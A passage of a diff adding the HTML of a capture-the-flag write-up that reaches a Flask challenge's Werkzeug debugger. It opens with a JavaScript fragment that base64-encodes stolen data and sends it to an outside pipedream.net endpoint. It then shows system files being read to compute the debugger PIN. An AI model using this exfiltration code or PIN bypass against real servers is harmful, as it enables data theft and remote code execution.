+        <span class="p">.</span><span class="nf">then</span><span class="p">(</span><span class="nx">data</span> <span class="o">=&gt;</span> <span class="p">{</span>
+            <span class="kd">const</span> <span class="nx">encodedData</span> <span class="o">=</span> <span class="nf">btoa</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
+            <span class="kd">const</span> <span class="nx">url</span> <span class="o">=</span> <span class="s2">`https://en2celr7rewbul.m.pipedream.net/?flag=</span><span class="p">${</span><span class="nx">encodedData</span><span class="p">}</span><span class="s2">`</span><span class="p">;</span>
+            <span class="nf">fetch</span><span class="p">(</span><span class="nx">url</span><span class="p">);</span>
+        <span class="p">});</span>
+<span class="p">});</span>
+</code></pre></div></div>
+
+<p>/sys/class/net/eth0/address</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt;&gt;&gt; "".join("02:42:ac:11:00:02".split(":"))
+'0242ac110002'
+&gt;&gt;&gt; print(0x0242ac110002)
+2485377892354
+</code></pre></div></div>
+
+<p>/proc/sys/kernel/random/boot_id</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>d2ad6c68-ebf1-4090-85ff-60e0b7c2fb86
+</code></pre></div></div>
+
+<p>/proc/self/cgroup</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>12:blkio:/docker/97cb5dd0fb03213072481c8a621847f1a310238d2db0de37ac81c8116a509c3a
+11:cpuset:/docker/97cb5dd0fb03213072481c8a621847f1a310238d2db0de37ac81c8116a509c3a
+10:freezer:/docker/97cb5dd0fb03213072481c8a621847f1a310238d2db0de37ac81c8116a509c3a
+</code></pre></div></div>
+
+<p>machine id =&gt;</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>d2ad6c68-ebf1-4090-85ff-60e0b7c2fb8697cb5dd0fb03213072481c8a621847f1a310238d2db0de37ac81c8116a509c3a
+</code></pre></div></div>
+
+<p>/etc/machine_id can be ignored as this file doesn’t exist on our challenge server.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">probably_public_bits</span> <span class="o">=</span> <span class="p">[</span>
+    <span class="sh">'</span><span class="s">root</span><span class="sh">'</span><span class="p">,</span><span class="c1"># username
+</span>    <span class="sh">'</span><span class="s">flask.app</span><span class="sh">'</span><span class="p">,</span><span class="c1"># modname
+</span>    <span class="sh">'</span><span class="s">Flask</span><span class="sh">'</span><span class="p">,</span><span class="c1"># getattr(app, '__name__', getattr(app.__class__, '__name__'))
+</span>    <span class="sh">'</span><span class="s">/usr/local/lib/python3.11/site-packages/flask/app.py</span><span class="sh">'</span> <span class="c1"># getattr(mod, '__file__', None),
+</span><span class="p">]</span>
+
+<span class="n">private_bits</span> <span class="o">=</span> <span class="p">[</span>
+    <span class="sh">'</span><span class="s">2485377892354</span><span class="sh">'</span><span class="p">,</span><span class="c1"># str(uuid.getnode()),  /sys/class/net/ens33/address 
+</span>    <span class="c1"># Machine Id: /etc/machine-id + /proc/sys/kernel/random/boot_id + /proc/self/cgroup
+</span>    <span class="sh">'</span><span class="s">d2ad6c68-ebf1-4090-85ff-60e0b7c2fb8697cb5dd0fb03213072481c8a621847f1a310238d2db0de37ac81c8116a509c3a</span><span class="sh">'</span>
+<span class="p">]</span>
+</code></pre></div></div>
+
+<p>Now run the script werkzeug-pin-bypass.py and you will have the pin</p>
+
+<p>You can see here that they are indeed same :)
+<img src="https://user-images.githubusercontent.com/31372554/254167983-a0a1401b-cf80-4e17-b17f-94f8f1cb1635.png" alt="image" /></p>
+
+<p>0xbla did all this scripting work in no time so thanks to him we were able to complete this challenge in no time.</p>
+
+<p>And at last we had the flag</p>
+
+<p><img src="https://github.com/Sudistark/CTF-Writeups/assets/31372554/02eb4516-ef05-41ea-b9fc-2e36755ddd85" alt="image" /></p>
+
